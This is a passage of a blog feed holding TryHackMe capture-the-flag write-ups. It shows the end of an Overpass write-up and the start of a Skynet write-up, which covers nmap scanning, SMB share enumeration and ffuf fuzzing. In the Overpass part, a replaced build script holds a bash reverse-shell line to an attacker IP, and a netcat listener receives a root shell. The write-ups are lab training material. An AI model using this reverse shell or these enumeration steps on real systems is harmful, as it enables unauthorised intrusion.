+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat buildscript.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#!/bin/bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/bash -i &amp;gt;&lt;span class="p">&amp;amp;&lt;/span> /dev/tcp/10.18.20.116/5555 0&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So when I started the server it took my script and I got a reverse shell:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">5555&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">5555&lt;/span> ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.192.193&lt;span class="o">]&lt;/span> &lt;span class="m">39270&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: cannot &lt;span class="nb">set&lt;/span> terminal process group &lt;span class="o">(&lt;/span>2104&lt;span class="o">)&lt;/span>: Inappropriate ioctl &lt;span class="k">for&lt;/span> device
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: no job control in this shell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@overpass-prod:~# whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>Skynet Writeup THM</title><link>https://simonefelici.github.io/p/skynet-writeup-thm/</link><pubDate>Thu, 28 Dec 2023 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/skynet-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled.png" alt="Featured image of post Skynet Writeup THM" />&lt;p>The first step is to do a nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -A &amp;lt;machine_ip&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-29 09:06 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.34.11
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.062s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">994&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.18 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.18 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Skynet
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">110/tcp open pop3 Dovecot pop3d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_pop3-capabilities: AUTH-RESP-CODE RESP-CODES CAPA SASL UIDL PIPELINING TOP
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span class="o">(&lt;/span>workgroup: WORKGROUP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">143/tcp open imap Dovecot imapd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_imap-capabilities: SASL-IR more ENABLE LOGINDISABLEDA0001 OK IDLE post-login listed capabilities IMAP4rev1 have ID Pre-login LITERAL+ LOGIN-REFERRALS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span class="o">(&lt;/span>workgroup: WORKGROUP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>We can see that it has:&lt;/p>
+&lt;ul>
+&lt;li>SSH&lt;/li>
+&lt;li>HTTP&lt;/li>
+&lt;li>pop3&lt;/li>
+&lt;li>netbios&lt;/li>
+&lt;li>imap&lt;/li>
+&lt;li>and samba open&lt;/li>
+&lt;/ul>
+&lt;p>The most interessing are ssh, http and samba.&lt;/p>
+&lt;p>The first thing that I am going to do is, enumerate samba, as sugested by the room.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -p &lt;span class="m">445&lt;/span> --script&lt;span class="o">=&lt;/span>smb-enum-shares.nse,smb-enum-users.nse &amp;lt;machine_ip&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-29 09:32 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.34.11
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.060s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb-enum-shares:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> account_used: guest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.34.11&lt;span class="se">\I&lt;/span>PC$:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_IPC_HIDDEN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: IPC Service &lt;span class="o">(&lt;/span>skynet server &lt;span class="o">(&lt;/span>Samba, Ubuntu&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Users: &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max Users: &amp;lt;unlimited&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Path: C:&lt;span class="se">\t&lt;/span>mp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: READ/WRITE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Current user access: READ/WRITE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.34.11&lt;span class="se">\a&lt;/span>nonymous:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_DISKTREE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: Skynet Anonymous Share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Users: &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max Users: &amp;lt;unlimited&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Path: C:&lt;span class="se">\s&lt;/span>rv&lt;span class="se">\s&lt;/span>amba
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: READ/WRITE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Current user access: READ/WRITE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.34.11&lt;span class="se">\m&lt;/span>ilesdyson:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_DISKTREE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: Miles Dyson Personal Share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Users: &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max Users: &amp;lt;unlimited&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Path: C:&lt;span class="se">\h&lt;/span>ome&lt;span class="se">\m&lt;/span>ilesdyson&lt;span class="se">\s&lt;/span>hare
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: &amp;lt;none&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Current user access: &amp;lt;none&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.34.11&lt;span class="se">\p&lt;/span>rint$:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_DISKTREE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: Printer Drivers
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Users: &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max Users: &amp;lt;unlimited&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Path: C:&lt;span class="se">\v&lt;/span>ar&lt;span class="se">\l&lt;/span>ib&lt;span class="se">\s&lt;/span>amba&lt;span class="se">\p&lt;/span>rinters
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: &amp;lt;none&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Current user access: &amp;lt;none&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb-enum-users:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> SKYNET&lt;span class="se">\m&lt;/span>ilesdyson &lt;span class="o">(&lt;/span>RID: 1000&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Full name:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Description:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Flags: Normal user account
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 13.61 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As we can see it has Anonymous open: \10.10.34.11\anonymous:&lt;/p>
+&lt;p>So I am going to enter in that folder.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">. D &lt;span class="m">0&lt;/span> Thu Nov &lt;span class="m">26&lt;/span> 11:04:00 &lt;span class="m">2020&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.. D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 03:20:17 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">attention.txt N &lt;span class="m">163&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 23:04:59 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">logs D &lt;span class="m">0&lt;/span> Wed Sep &lt;span class="m">18&lt;/span> 00:42:16 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Inside that folder we find one file and a directory, I am just going to download them.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat attention.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-Miles Dyson
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So, here we see Miles Dyson again, that tells everyone to change the passwords.&lt;/p>
+&lt;p>In the first log file instead we get a list of passwords, the newer is the one that we are searching for.&lt;/p>
+&lt;p>The other two are empty, but maybe there are other two accounts.&lt;/p>
+&lt;p>Now that we have an username and password I tried to connect to the smb share of Miles, but it didn’t go weel:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient //10.10.34.11/milesdyson -U milesdyson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>WORKGROUP&lt;span class="se">\m&lt;/span>ilesdyson&lt;span class="o">]&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">session setup failed: NT_STATUS_LOGON_FAILURE
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So I just went to the next phase, the web page.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>From the web page we only get this thing, but we could do a directory fuzzing for more results.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.34.11/FUZZ -w /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.34.11/FUZZ
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 69ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 68ms&lt;span class="o">]&lt;/span>
